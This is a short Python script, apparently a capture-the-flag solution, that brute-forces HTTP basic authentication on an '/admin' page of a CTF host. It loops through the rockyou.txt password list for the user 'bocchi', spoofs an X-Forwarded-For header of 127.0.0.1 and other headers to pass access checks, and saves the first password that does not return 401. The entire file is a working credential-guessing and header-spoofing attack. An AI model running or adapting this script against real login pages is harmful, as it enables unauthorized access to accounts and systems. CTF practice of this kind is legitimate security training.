import requests
import numpy as np

from tqdm import tqdm

lines = open("./debug/rockyou.txt", "r",encoding="latin-1").readlines()


pbar = tqdm(total=len(lines))


def request():
    for idx, pw in enumerate(lines):
        pw=pw.strip()
        #print(pw)
        r = requests.get('http://ctf.adl.tw:12002/admin',
                         headers={"X-Forwarded-For": "127.0.0.1",
                                  "User-Agent": "STARRYBrowser",
                                  "Accept-Language": "ja-JP"}, auth=("bocchi", pw))
        if r.status_code!=401:
            print('found it:',pw)
            
            with open('./debug/pw.txt', 'w') as f:
                f.write(pw)
            
            print('\n',r.text)
            break
        if idx % 100 == 0:
            pbar.update(100)

request()
